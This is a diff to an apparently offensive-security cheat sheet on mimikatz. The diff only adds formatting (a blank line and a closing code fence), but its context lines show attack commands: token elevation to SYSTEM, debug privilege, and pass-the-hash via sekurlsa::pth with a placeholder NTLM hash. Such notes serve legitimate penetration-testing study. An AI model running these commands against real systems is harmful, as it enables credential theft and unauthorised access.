@@ -25,6 +25,7 @@ Download from github repo: [https://github.com/gentilkiwi/mimikatz](https://gith
 
 ## Basic usage
 
+
 ```bash
 # Impersonate as NT Authority/SYSTEM (having permissions for it).
 token::elevate
@@ -45,4 +46,5 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /
 # /run:<Command>: For example /run:cmd.exe
 # 2. After that, we canuse cmd.exe to execute commands in the user's context. 
 
+```
 
